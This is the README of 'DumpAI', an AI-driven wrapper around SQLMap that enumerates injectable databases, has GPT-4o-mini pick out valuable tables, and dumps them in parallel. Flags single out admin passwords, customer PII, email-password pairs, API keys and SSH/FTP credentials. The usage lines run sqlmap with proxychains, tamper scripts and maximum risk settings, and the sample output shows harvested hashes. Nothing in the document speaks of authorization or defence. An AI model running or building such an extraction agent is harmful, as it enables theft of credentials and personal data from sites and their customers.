# DumpAI v2.2

**AI-Powered Autonomous SQLMap Data Extractor**

Intelligent extraction agent that uses AI to analyze database schemas, identify valuable data, and extract it efficiently using parallel SQLMap processes.

## Architecture

```
+-----------------------------------------------------------------------------------+
|                               DumpAI Agent                                        |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|   +----------------+    +------------------+    +--------------------+            |
|   |    Memory      |    |     Tools        |    |    AI Engine       |            |
|   |----------------|    |------------------|    |--------------------|            |
|   | - Action Log   |    | EnumerateDBs     |    | GPT-4o-mini        |            |
|   | - Error Log    |    | EnumTables       |    |                    |            |
|   | - Column Cache |    | GetColumns       |    | - Schema Analysis  |            |
|   | - Stats        |    | SearchTables     |    | - Column Mapping   |            |
|   | - Session ID   |    | SearchColumns    |    | - CMS Detection    |            |
|   |                |    | DumpTable        |    | - Categorization   |            |
|   | Saves to:      |    | DumpColumns      |    |                    |            |
|   | session_*.json |    | AnalyzeSchema    |    | Fallback: pattern  |            |
|   +----------------+    | AnalyzeColumns   |    | matching if no AI  |            |
|                         +------------------+    +--------------------+            |
|                                                                                   |
+-----------------------------------------------------------------------------------+
|                            SQLMap Executor (Parallel)                             |
|   +-------------+  +-------------+  +-------------+  +-------------+              |
|   | Worker 1    |  | Worker 2    |  | Worker 3    |  | Worker N    |              |
|   | sqlmap -C   |  | sqlmap -C   |  | sqlmap -C   |  | sqlmap -C   |              |
|   | col1 --dump |  | col2 --dump |  | col3 --dump |  | colN --dump |              |
|   +-------------+  +-------------+  +-------------+  +-------------+              |
+-----------------------------------------------------------------------------------+
|                               Workflow                                            |
|   [1. Enumerate] --> [2. AI Analysis] --> [3. Parallel Dump] --> [4. Save JSON]  |
+-----------------------------------------------------------------------------------+
```

## Installation

```bash
git clone https://github.com/44pie/dumpai.git
cd dumpai
pip install openai tenacity
```

## Flags

### Required
| Flag | Description |
|------|-------------|
| `-c, --command` | SQLMap base command |

### Categories
| Flag | Description |
|------|-------------|
| `--user-data` | Admin accounts, passwords, tokens |
| `--customer-data` | Customer PII (names, emails, phones) |
| `--email-pass` | Email + password pairs |
| `--api-key` | API keys, secrets, tokens |
| `--sys-data` | System creds (DB, FTP, SSH) |
| `--all` | All categories |

### Performance
| Flag | Default | Description |
|------|---------|-------------|
| `-p, --parallel` | 5 | Max parallel workers |
| `-mr, --max-rows` | 0 | Limit rows per table (0=all) |
| `--no-parallel` | - | Disable parallel SQLMap |
| `--smart-search` | auto | Force pattern-based search |

### Output
| Flag | Default | Description |
|------|---------|-------------|
| `-o, --output` | dumpai_out | Output directory |
| `-v, --verbose` | - | Debug output |
| `--resume` | - | Resume from session file |

## Usage

```bash
# Basic
python3 dumpai.py -c "sqlmap -r req.txt -p id --batch" --user-data --sys-data

# All data with row limit
python3 dumpai.py -c "sqlmap -r req.txt -p id --batch -D mydb" --all -mr 100

# With proxychains
python3 dumpai.py -c "proxychains4 -q sqlmap -r req.txt --batch" --all

# Advanced
python3 dumpai.py -c "sqlmap -r req.txt --batch --risk=3 --level=5 \
    --dbms=mysql --technique=TBEUSQ --tamper=randomcase" --all -mr 50 -v
```

## Categories & Patterns

| Category | Tables | Columns |
|----------|--------|---------|
| user_data | admin, user, employee, staff | pass, pwd, hash, token |
| customer_data | customer, client, order | email, phone, address |
| email_pass | user, member, account | email + password |
| api_key | api, token, oauth, credential | api_key, secret |
| sys_data | config, setting, connection | server, host, password |

## Output

```json
{
  "meta": {
    "database": "shop_db",
    "cms": "PrestaShop",
    "duration": 125.5,
    "tables_processed": 8,
    "rows_extracted": 1250
  },
  "data": {
    "user_data": [{"uname": "admin", "pass": "hash", "_source_table": "users"}],
    "customer_data": [...],
    "email_pass": [...],
    "api_key": [...],
    "sys_data": [...]
  }
}
```

## v2.2 Features

- **Parallel SQLMap**: Each column dumped by separate process
- **Row Limiting**: `-mr` flag to limit extraction
- **Smart Search**: Pattern-based for blind injections
- **AI Analysis**: Schema/column analysis with GPT-4o-mini
- **CMS Detection**: PrestaShop, WordPress, Magento
- **Session Persistence**: Save/resume capability

## Files

```
dumpai/
├── dumpai.py       # CLI
├── agent.py        # Main logic
├── memory.py       # State
└── tools/
    ├── base.py     # SQLMap executor
    ├── enumerate.py
    ├── dump.py
    └── analyze.py
```

## Requirements

- Python 3.8+
- SQLMap
- `OPENAI_API_KEY` env var
